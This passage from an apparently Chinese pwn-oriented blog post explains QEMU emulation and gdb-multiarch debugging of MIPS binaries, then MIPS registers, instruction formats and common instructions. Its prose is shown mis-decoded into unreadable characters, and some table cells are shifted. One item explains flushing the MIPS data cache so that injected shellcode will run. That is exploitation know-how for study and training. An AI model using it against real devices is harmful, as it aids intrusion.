sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt <span class="hljs-keyword">update</span><br>sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu qemu<span class="hljs-operator">-</span><span class="hljs-keyword">system</span><span class="hljs-operator">-</span>mips qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span> qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure><ul><li>è¿œè¡Œæµç¨‹</li></ul><p>æ ¹æ®å¯æ‰§è¡Œæ–‡ä»¶æ¶æ„ï¼Œé€‰æ‹©å¯¹åº”çš„ qemu æ¥è¿è¡Œã€‚</p><p>ä¾‹å¦‚ MIPS 32ä½å°ç«¯åºæ¶æ„ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© <code>qemu-mipsel</code> æ¥è¿è¡Œ</p><p>è¿™é‡Œè¿˜è¦åŒºåˆ†é“¾æ¥æ–¹å¼ï¼Œå¦‚æœåŠ¨æ€é“¾æ¥åˆ™éœ€è¦æŒ‡å®šåŠ¨æ€é“¾æ¥åº“ã€‚</p><p><strong>é™æ€é“¾æ¥ï¼š</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-mipsel-<span class="hljs-keyword">static</span> ./demo<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€é“¾æ¥ï¼š</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mipsel -L /usr/mipsel-linux-gnu ./demo<br></code></pre></td></tr></table></figure><ul><li>è°ƒè¯•æµç¨‹</li></ul><p>å®‰è£…<code>gdb-multiarch</code>æ¥è°ƒè¯•å¼‚æ¶æ„ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install  gdb-multiarch<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬é€šè¿‡ qemu ä»¥è°ƒè¯•æ¨¡å¼è¿è¡Œç¨‹åºï¼Œ<code>-g</code>å‚æ•°è¡¨ç¤ºè®¾ç½®ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œ<code>1234</code>è¡¨ç¤ºç¨‹åºæ˜ å°„çš„ç«¯å£ã€‚</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-mipsel-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> ./demo<br></code></pre></td></tr></table></figure><p>ç„¶åè¿è¡Œ<code>gdb-multiarch</code>ï¼Œå¹¶æ ¹æ®æ¶æ„å’Œç«¯åºè®¾ç½®å‚æ•°ã€‚</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch<br><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">mips</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br></code></pre></td></tr></table></figure><p>ç„¶åè¿æ¥æ˜ å°„ç¨‹åºçš„ç«¯å£</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><h2 id="è¿è¡Œä¸è°ƒè¯•"><a href="#è¿è¡Œä¸è°ƒè¯•" class="headerlink" title="è¿è¡Œä¸è°ƒè¯•"></a>è¿è¡Œä¸è°ƒè¯•</h2><p>è¿è¡ŒåŠ¨æ€é“¾æ¥ç¨‹åºï¼Œéœ€è¦é€šè¿‡<code>-L</code>å‚æ•°æŒ‡å®šåŠ¨æ€é“¾æ¥åº“ä½ç½®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ ./pwn<br></code></pre></td></tr></table></figure><p>è¿è¡Œé™æ€é“¾æ¥ç¨‹åºï¼Œç›´æ¥ä½¿ç”¨ qemu è¿è¡Œå³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-mipsel ./pwn<br></code></pre></td></tr></table></figure><p>gcc äº¤å‰ç¼–è¯‘ mips ç¨‹åºã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mipsel-linux-gnu-gcc vuln.<span class="hljs-keyword">c</span> -o vuln<br></code></pre></td></tr></table></figure><ul><li>è°ƒè¯•</li></ul><p>é€šè¿‡ qemu è¿è¡Œç¨‹åºæ˜ å°„åˆ°ç«¯å£ï¼Œç„¶åé€šè¿‡ gdb è¿æ¥è°ƒè¯•ã€‚</p><p>qemu å°†ä¸€ä¸ª mips ç¨‹åºè¿è¡Œå¹¶æ˜ å°„åˆ° 1234 ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-mipsel -L /usr/mipsel-linux-gnu/ -g 1234 ./pwn<br>gdb-multiarch ./pwn -q<br>set architecture mips<br>target remote localhost:1234<br></code></pre></td></tr></table></figure><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">show</span> architecture<br></code></pre></td></tr></table></figure><h2 id="MIPS-æ¶æ„çŸ¥è¯†"><a href="#MIPS-æ¶æ„çŸ¥è¯†" class="headerlink" title="MIPS æ¶æ„çŸ¥è¯†"></a>MIPS æ¶æ„çŸ¥è¯†</h2><ul><li><p>MIPSÂ å›ºå®šÂ <code>4</code>Â å­—èŠ‚æŒ‡ä»¤é•¿åº¦</p></li><li><p>æ ˆæ˜¯ä»å†…å­˜çš„é«˜åœ°å€å‘ä½åœ°å€æ–¹å‘å¢é•¿çš„</p></li><li><p>å¶å­å‡½æ•°ï¼šå‡½æ•°å†…éƒ¨æ²¡æœ‰å†è°ƒç”¨å…¶ä»–å‡½æ•°</p></li><li><p>éå¶å­å‡½æ•°ï¼šå‡½æ•°å†…éƒ¨è°ƒç”¨å…¶ä»–å‡½æ•°çš„å‡½æ•°</p></li><li><p>æµæ°´çº¿æ•ˆåº”ï¼šåœ¨åˆ†æÂ MIPSÂ æ±‡ç¼–ä»£ç æ—¶ä¼šå‘ç°ï¼Œå…¶è·³è½¬åˆ°å‡½æ•°æˆ–è€…åˆ†æ”¯è·³è½¬è¯­å¥çš„ä¸‹ä¸€æ¡éƒ½æ˜¯Â <code>nop</code>Â ï¼ˆï¼‰ï¼Œè¿™æ˜¯å› ä¸ºÂ MIPSÂ é‡‡ç”¨äº†é«˜åº¦çš„æµæ°´çº¿ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯è·³è½¬æŒ‡ä»¤å¯¼è‡´çš„<strong>åˆ†æ”¯å»¶è¿Ÿæ•ˆåº”</strong>ã€‚åœ¨åˆ†æ”¯è·³è½¬è¯­å¥åé¢é‚£æ¡è¯­å¥å«åš<strong>åˆ†æ”¯å»¶è¿Ÿæ§½</strong>ï¼Œå½“è·³è½¬è¯­å¥åˆšæ‰§è¡Œçš„ä¸€ç¬é—´ï¼Œè·³è½¬åˆ°çš„åœ°å€åˆšå¡«å……å¥½ï¼ˆå¡«å……åˆ°ç¨‹åºè®¡æ•°å™¨ï¼‰ï¼Œ<strong>è¿˜æ²¡æœ‰æ‰§è¡Œç¨‹åºè®¡æ•°å™¨ä¸­å­˜æ”¾çš„æŒ‡ä»¤ï¼Œåˆ†æ”¯å»¶è¿Ÿæ§½çš„æŒ‡ä»¤å·²ç»è¢«æ‰§è¡Œäº†ï¼Œè¿™å°±æ˜¯æµæ°´çº¿æ•ˆåº”</strong>ï¼ˆå‡ æ¡æŒ‡ä»¤è¢«åŒæ—¶æ‰§è¡Œï¼Œåªæ˜¯å¤„äºä¸åŒçš„é˜¶æ®µï¼ŒÂ <strong>MIPSÂ ä¸åƒå…¶ä»–æ¶æ„é‚£æ ·å­˜åœ¨æµæ°´çº¿é˜»å¡</strong>ï¼‰ï¼Œä¸ºäº†é¿å…å‡ºç°é—®é¢˜ï¼Œå› æ­¤åœ¨åˆ†æ”¯è·³è½¬è¯­å¥çš„ä¸‹ä¸€æ¡æŒ‡ä»¤é€šå¸¸æ˜¯Â <code>nop</code>Â æŒ‡ä»¤æˆ–è€…å…¶ä»–æœ‰ç”¨çš„æŒ‡ä»¤ã€‚</p></li><li><p>ç¼“å­˜åˆ·æ–°æœºåˆ¶ï¼š<code>MIPS CPUs</code>æœ‰ä¸¤ä¸ªç‹¬ç«‹çš„Â <code>cache</code>Â :Â <code>æŒ‡ä»¤cache</code>Â å’ŒÂ <code>æ•°æ®cache</code>Â ã€‚ æŒ‡ä»¤å’Œæ•°æ®åˆ†åˆ«åœ¨ä¸¤ä¸ªä¸åŒçš„ç¼“å­˜ä¸­ã€‚å½“ç¼“å­˜æ»¡äº†ï¼Œä¼šè§¦å‘Â <code>flush</code>Â , å°†æ•°æ®å†™å›åˆ°ä¸»å†…å­˜ã€‚æ”»å‡»è€…çš„æ”»å‡»<code>payload</code>Â é€šå¸¸ä¼šè¢«åº”ç”¨å½“åšæ•°æ®æ¥å¤„ç†ï¼Œå­˜å‚¨åœ¨æ•°æ®ç¼“å­˜ä¸­ã€‚å½“Â <code>payload</code>Â è§¦å‘æ¼æ´ï¼Œ åŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹çš„æ—¶å€™ï¼Œä¼šå»æ‰§è¡Œå†…å­˜ä¸­çš„Â <code>shellcode</code>Â .å¦‚æœæ•°æ®ç¼“å­˜æ²¡æœ‰è§¦å‘Â <code>flush</code>Â çš„è¯ï¼Œ<code>shellcode</code>Â ä¾ç„¶å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œè€Œæ²¡æœ‰å†™å…¥ä¸»å†…å­˜ã€‚è¿™ä¼šå¯¼è‡´ç¨‹åºæ‰§è¡Œäº†æœ¬è¯¥å­˜å‚¨Â <code>shellcode</code>Â çš„åœ°å€å¤„éšæœºçš„ä»£ç ï¼Œå¯¼è‡´ä¸å¯é¢„çŸ¥çš„åæœã€‚(é€šå¸¸æ‰§è¡ŒÂ <code>sleep(1)</code>Â åˆ·æ–°)</p></li><li><p>åªæœ‰ç‰¹å®šçš„æŒ‡ä»¤ï¼ˆå¦‚ <code>lw</code> å’Œ <code>sw</code>ï¼‰å¯ä»¥è®¿é—®å†…å­˜ï¼Œæ‰€æœ‰å…¶ä»–æ“ä½œéƒ½åœ¨å¯„å­˜å™¨ä¹‹é—´å®Œæˆã€‚è¿™ç§è®¾è®¡ç®€åŒ–äº†æŒ‡ä»¤å’Œæµæ°´çº¿æ“ä½œã€‚</p></li></ul><h2 id="æ±‡ç¼–åŸºç¡€"><a href="#æ±‡ç¼–åŸºç¡€" class="headerlink" title="æ±‡ç¼–åŸºç¡€"></a>æ±‡ç¼–åŸºç¡€</h2><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><p>MIPS æœ‰ 32 ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œå…¶ä¸­æ¯ä¸ªå¯„å­˜å™¨éƒ½æ˜¯ 32 ä½ï¼Œç”¨äºå­˜å‚¨æ“ä½œæ•°ã€ä¸­é—´ç»“æœã€è¿”å›åœ°å€ç­‰ã€‚</p><table><thead><tr><th>å¯„å­˜å™¨ç¼–å·</th><th>å¯„å­˜å™¨åç§°</th><th>å¯„å­˜å™¨æè¿°</th></tr></thead><tbody><tr><td>0</td><td><code>zero</code></td><td>æ°¸è¿œä¸ºé›¶</td></tr><tr><td>1</td><td><code>$at</code></td><td>ä¿ç•™å¯„å­˜å™¨</td></tr><tr><td>2~3</td><td><code>$v0~$v1</code></td><td>å‡½æ•°è¿”å›å€¼</td></tr><tr><td>4~7</td><td><code>a0-a3</code></td><td>å‡½æ•°å‚æ•°å¯„å­˜å™¨ï¼Œä¸å¤Ÿç”¨å †æ ˆå¤„ç†</td></tr><tr><td>8~15</td><td><code>t0-t7</code></td><td>ä¸´æ—¶å¯„å­˜å™¨</td></tr><tr><td>16~23</td><td><code>$s0~$s7</code></td><td>ä¿å­˜å¯„å­˜å™¨ï¼Œç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨ä¸­çš„å‚æ•°å’Œè¿”å›å€¼</td></tr><tr><td>24~25</td><td><code>$t8~$t9</code></td><td>ä¸´æ—¶å¯„å­˜å™¨</td></tr><tr><td>26~27</td><td><code>$k0~$k1</code></td><td>ä¿ç•™å¯„å­˜å™¨</td></tr><tr><td>28</td><td><code>$gp</code></td><td>å…¨å±€æŒ‡é’ˆ</td></tr><tr><td>29</td><td><code>$sp</code></td><td>å †æ ˆæŒ‡é’ˆ</td></tr><tr><td>30</td><td><code>$fp</code></td><td>ä¿å­˜æ ˆæŒ‡é’ˆ</td></tr><tr><td>31</td><td><code>$ra</code></td><td>è¿”å›åœ°å€</td></tr></tbody></table><p>MIPS æ¶æ„ä¸­è¿˜å®šä¹‰äº† 3 ä¸ªç‰¹æ®Šçš„å¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯<code>PC</code>ï¼ˆç¨‹åºè®¡æ•°å™¨ï¼‰ã€<code>HI</code>ï¼ˆä¹˜é™¤ç»“æœé«˜ä½å¯„å­˜å™¨ï¼‰ã€<code>LO</code>ï¼ˆä¹˜é™¤ç»“æœä½ä½å¯„å­˜å™¨ï¼‰ã€‚</p><h3 id="æŒ‡ä»¤æ ¼å¼"><a href="#æŒ‡ä»¤æ ¼å¼" class="headerlink" title="æŒ‡ä»¤æ ¼å¼"></a>æŒ‡ä»¤æ ¼å¼</h3><p>MIPS çš„æŒ‡ä»¤é›†é‡‡ç”¨ 3 ç§ä¸»è¦æ ¼å¼ï¼š</p><ol><li><p>R å‹æŒ‡ä»¤ï¼ˆRegisterï¼‰</p><ul><li>è¿™ç§æŒ‡ä»¤æ ¼å¼ç”¨äºå¯„å­˜å™¨ä¹‹é—´çš„æ“ä½œã€‚</li><li>æ ¼å¼ï¼š<code>opcode | rs | rt | rd | shamt | funct</code><ul><li>opcodeï¼šæ“ä½œç ï¼ŒæŒ‡ä»¤è¯¥æŒ‡ä»¤çš„æ“ä½œç±»å‹ã€‚</li><li>rs,rtï¼šæºå¯„å­˜å™¨ã€‚</li><li>rdï¼šç›®æ ‡å¯„å­˜å™¨ã€‚</li><li>shamtï¼šç§»ä½æ“ä½œçš„ä½æ•°ã€‚</li><li>functï¼šæŒ‡å®šå…·ä½“æ“ä½œçš„é™„åŠ æ“ä½œç ã€‚</li></ul></li></ul></li><li><p>I å‹æŒ‡ä»¤ï¼ˆImmediateï¼‰</p><ul><li>è¿™ç§æŒ‡ä»¤ç”¨äºå¤„ç†ç«‹å³æ•°ï¼ˆå¸¸é‡ï¼‰å’Œå¯„å­˜å™¨çš„æ“ä½œã€‚</li><li>æ ¼å¼ï¼š<code>opcode | rs | rt | immediate</code><ul><li><code>opcode</code>ï¼šæ“ä½œç ï¼ŒæŒ‡å®šè¯¥æŒ‡ä»¤çš„æ“ä½œç±»å‹ã€‚</li><li><code>rs</code>ï¼šæºå¯„å­˜å™¨ã€‚</li><li><code>rt</code>ï¼šç›®æ ‡å¯„å­˜å™¨ã€‚</li><li><code>immediate</code>ï¼šç«‹å³æ•°ï¼Œç”¨äºä¸å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œè¿ç®—ã€‚</li></ul></li></ul></li><li><p>J å‹æŒ‡ä»¤ï¼ˆJumpï¼‰</p><ul><li>è¿™ç§æŒ‡ä»¤ç”¨äºè·³è½¬åˆ°å…¶ä»–åœ°å€ã€‚</li><li>æ ¼å¼ï¼š<code>opcode | address</code><ul><li><code>opcode</code>ï¼šæ“ä½œç ã€‚</li><li><code>address</code>ï¼šè·³è½¬ç›®æ ‡åœ°å€ã€‚</li></ul></li></ul></li></ol><h3 id="å¯»å€æ–¹å¼"><a href="#å¯»å€æ–¹å¼" class="headerlink" title="å¯»å€æ–¹å¼"></a>å¯»å€æ–¹å¼</h3><ol start="4"><li>ç«‹å³æ•°å¯»å€ï¼šæ“ä½œæ•°æ˜¯ä½äºæŒ‡ä»¤è‡ªèº«ä¸­çš„å¸¸æ•°ã€‚</li></ol><p>å°† <code>$t1</code> ä¸­çš„å€¼åŠ ä¸Šå¸¸æ•° 10ï¼Œå¹¶å­˜å‚¨åœ¨ <code>$t0</code> ä¸­</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addi </span>$<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">t1</span>, <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><ol start="5"><li>å¯„å­˜å™¨å¯»å€ï¼šæ“ä½œæ•°æ˜¯å¯„å­˜å™¨ã€‚</li></ol><p>å°† <code>$t1</code> å’Œ <code>$t2</code> çš„å€¼ç›¸åŠ ï¼Œç»“æœå­˜å‚¨åœ¨ <code>$t0</code> ä¸­</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">add</span> <span class="hljs-variable">$t0</span>, <span class="hljs-variable">$t1</span>, <span class="hljs-variable">$t2</span><br></code></pre></td></tr></table></figure><ol start="6"><li>åŸºå€å¯»å€æˆ–åç§»å¯»å€ï¼šæ“ä½œæ•°åœ¨å†…å­˜ä¸­ï¼Œå…¶åœ°å€æ˜¯æŒ‡ä»¤ä¸­åŸºå€å¯„å­˜å™¨å’Œå¸¸æ•°çš„å’Œï¼Œå¦‚lwä¸swæŒ‡ä»¤ã€‚</li></ol><p>ä» <code>$t1</code> ä¸­çš„åŸºå€åŠ ä¸Šåç§»é‡ 4 çš„å†…å­˜åœ°å€å¤„åŠ è½½æ•°æ®åˆ° <code>$t0</code> ä¸­ï¼Œç„¶åå°† <code>$t0</code> çš„å€¼å­˜å‚¨åˆ° <code>$sp</code> åŸºå€å‡å» 8 çš„å†…å­˜åœ°å€ä¸­ã€‚</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>$<span class="hljs-built_in">t0</span>, <span class="hljs-number">4</span>($<span class="hljs-built_in">t1</span>)<br><span class="hljs-keyword">sw </span>$<span class="hljs-built_in">t0</span>, -<span class="hljs-number">8</span>($<span class="hljs-built_in">sp</span>)<br></code></pre></td></tr></table></figure><ol start="7"><li><code>PC</code>ç›¸å¯¹å¯»å€ï¼šåœ°å€æ˜¯<code>PC</code>å’ŒæŒ‡ä»¤ä¸­å¸¸æ•°çš„å’Œã€‚</li></ol><p>å¦‚æœ <code>$t0</code> å’Œ <code>$t1</code> ç›¸ç­‰ï¼Œåˆ™è·³è½¬åˆ°åç§»åœ°å€å¤„æ‰§è¡Œ</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">beq </span>$<span class="hljs-built_in">t0</span>, $<span class="hljs-built_in">t1</span>, offset<br></code></pre></td></tr></table></figure><ol start="8"><li>ä¼ªç›´æ¥å¯»å€ï¼šè·³è½¬åœ°å€ç”±æŒ‡ä»¤ä¸­26å­—æ®µå’ŒPCé«˜ä½ç›¸è¿è€Œæˆã€‚</li></ol><p>è·³è½¬åˆ°ç›®æ ‡åœ°å€ï¼Œç”± <code>PC</code> é«˜ä½ä¸æŒ‡ä»¤ä¸­çš„ 26 ä½ç›®æ ‡å­—æ®µæ‹¼æ¥è€Œæˆ</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">j <span class="hljs-keyword">target</span><br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æŒ‡ä»¤"><a href="#å¸¸ç”¨æŒ‡ä»¤" class="headerlink" title="å¸¸ç”¨æŒ‡ä»¤"></a>å¸¸ç”¨æŒ‡ä»¤</h3><table><thead><tr><th>ç±»å‹</th><th>æŒ‡ä»¤</th><th>åŠŸèƒ½æè¿°</th><th>ç¤ºä¾‹</th><th></th></tr></thead><tbody><tr><td><strong>R å‹</strong></td><td><code>add</code></td><td>åŠ æ³•ï¼Œ$rd &#x3D; $rs + $rt</td><td><code>add $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>sub</code></td><td>å‡æ³•ï¼Œ$rd &#x3D; $rs - $rt</td><td><code>sub $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>and</code></td><td>æŒ‰ä½ä¸ï¼Œ$rd &#x3D; $rs &amp; $rt</td><td><code>and $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>or</code></td><td>æŒ‰ä½æˆ–ï¼Œ$rd &#x3D; $rs</td><td>$rt</td><td><code>or $t0, $t1, $t2</code></td></tr><tr><td><strong>R å‹</strong></td><td><code>xor</code></td><td>æŒ‰ä½å¼‚æˆ–ï¼Œ$rd &#x3D; $rs ^ $rt</td><td><code>xor $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>nor</code></td><td>æŒ‰ä½å–åæˆ–ï¼Œ$rd &#x3D; ~($rs</td><td>$rt)</td><td><code>nor $t0, $t1, $t2</code></td></tr><tr><td><strong>R å‹</strong></td><td><code>sll</code></td><td>é€»è¾‘å·¦ç§»ï¼Œ$rd &#x3D; $rt &lt;&lt; sa</td><td><code>sll $t0, $t1, 2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>srl</code></td><td>é€»è¾‘å³ç§»ï¼Œ$rd &#x3D; $rt &gt;&gt; sa</td><td><code>srl $t0, $t1, 2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>sra</code></td><td>ç®—æœ¯å³ç§»ï¼Œ$rd &#x3D; $rt &gt;&gt; sa</td><td><code>sra $t0, $t1, 2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>slt</code></td><td>å°äºï¼Œ$rd &#x3D; ($rs &lt; $rt) ? 1 : 0</td><td><code>slt $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>R å‹</strong></td><td><code>sltu</code></td><td>æ— ç¬¦å·å°äºï¼Œ$rd &#x3D; ($rs &lt; $rt unsigned) ? 1 : 0</td><td><code>sltu $t0, $t1, $t2</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>addi</code></td><td>åŠ æ³•ç«‹å³æ•°ï¼Œ$rt &#x3D; $rs + imm</td><td><code>addi $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>addiu</code></td><td>æ— ç¬¦å·åŠ æ³•ç«‹å³æ•°ï¼Œ$rt &#x3D; $rs + imm</td><td><code>addiu $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>andi</code></td><td>æŒ‰ä½ä¸ç«‹å³æ•°ï¼Œ$rt &#x3D; $rs &amp; imm</td><td><code>andi $t0, $t1, 0xFF</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>ori</code></td><td>æŒ‰ä½æˆ–ç«‹å³æ•°ï¼Œ$rt &#x3D; $rs</td><td>imm</td><td><code>ori $t0, $t1, 0xFF</code></td></tr><tr><td><strong>I å‹</strong></td><td><code>xori</code></td><td>æŒ‰ä½å¼‚æˆ–ç«‹å³æ•°ï¼Œ$rt &#x3D; $rs ^ imm</td><td><code>xori $t0, $t1, 0xFF</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>slti</code></td><td>å°äºç«‹å³æ•°ï¼Œ$rt &#x3D; ($rs &lt; imm) ? 1 : 0</td><td><code>slti $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>sltiu</code></td><td>æ— ç¬¦å·å°äºç«‹å³æ•°ï¼Œ$rt &#x3D; ($rs &lt; imm unsigned) ? 1 : 0</td><td><code>sltiu $t0, $t1, 10</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lui</code></td><td>åŠ è½½ä¸ŠåŠå­—ï¼Œ$rt &#x3D; imm &lt;&lt; 16</td><td><code>lui $t0, 0x1000</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lw</code></td><td>ä»å†…å­˜åŠ è½½å­—ï¼ˆ32ä½ï¼‰åˆ°å¯„å­˜å™¨ $rt</td><td><code>lw $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>sw</code></td><td>å°†å¯„å­˜å™¨ $rt çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­çš„åœ°å€ $t1 + offset</td><td><code>sw $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lb</code></td><td>ä»å†…å­˜åŠ è½½å­—èŠ‚ï¼ˆ8ä½ï¼‰åˆ°å¯„å­˜å™¨ $rt</td><td><code>lb $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lbu</code></td><td>ä»å†…å­˜åŠ è½½æ— ç¬¦å·å­—èŠ‚ï¼ˆ8ä½ï¼‰åˆ°å¯„å­˜å™¨ $rt</td><td><code>lbu $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>sb</code></td><td>å°†å¯„å­˜å™¨ $rt çš„ä½8ä½å­˜å‚¨åˆ°å†…å­˜ä¸­çš„åœ°å€ $t1 + offset</td><td><code>sb $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lh</code></td><td>ä»å†…å­˜åŠ è½½åŠå­—ï¼ˆ16ä½ï¼‰åˆ°å¯„å­˜å™¨ $rt</td><td><code>lh $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lhu</code></td><td>ä»å†…å­˜åŠ è½½æ— ç¬¦å·åŠå­—ï¼ˆ16ä½ï¼‰åˆ°å¯„å­˜å™¨ $rt</td><td><code>lhu $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>sh</code></td><td>å°†å¯„å­˜å™¨ $rt çš„ä½16ä½å­˜å‚¨åˆ°å†…å­˜ä¸­çš„åœ°å€ $t1 + offset</td><td><code>sh $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>lwc1</code></td><td>ä»å†…å­˜åŠ è½½å•ç²¾åº¦æµ®ç‚¹æ•°åˆ°æµ®ç‚¹å¯„å­˜å™¨ $f0</td><td><code>lwc1 $f0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>swc1</code></td><td>å°†æµ®ç‚¹å¯„å­˜å™¨ $f0 ä¸­çš„å•ç²¾åº¦æµ®ç‚¹æ•°å­˜å‚¨åˆ°å†…å­˜ä¸­çš„åœ°å€ $t1 + offset</td><td><code>swc1 $f0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>ld</code></td><td>ä»å†…å­˜åŠ è½½åŒå­—ï¼ˆ64ä½ï¼‰åˆ°å¯„å­˜å™¨ $rt</td><td><code>ld $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>I å‹</strong></td><td><code>sd</code></td><td>å°†å¯„å­˜å™¨ $rt çš„64ä½å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­çš„åœ°å€ $t1 + offset</td><td><code>sd $t0, 0($t1)</code></td><td></td></tr><tr><td><strong>J å‹</strong></td><td><code>j</code></td><td>æ— æ¡ä»¶è·³è½¬ï¼Œè·³è½¬åˆ°ç›®æ ‡åœ°å€</td><td><code>j target</code></td><td></td></tr><tr><td><strong>J å‹</strong></td><td><code>jal</code></td><td>è·³è½¬å¹¶é“¾æ¥ï¼Œå°†è¿”å›åœ°å€å­˜å‚¨åˆ° $ra</td><td><code>jal target</code></td><td></td></tr><tr><td><strong>J å‹</strong></td><td><code>jr</code></td><td>è·³è½¬åˆ°å¯„å­˜å™¨æŒ‡å®šçš„åœ°å€</td><td><code>jr $ra</code></td><td></td></tr><tr><td><strong>J å‹</strong></td><td><code>jalr</code></td><td>è·³è½¬å¹¶é“¾æ¥åˆ°å¯„å­˜å™¨æŒ‡å®šçš„åœ°å€ï¼Œè¿”å›åœ°å€å­˜å‚¨åœ¨ $ra</td><td><code>jalr 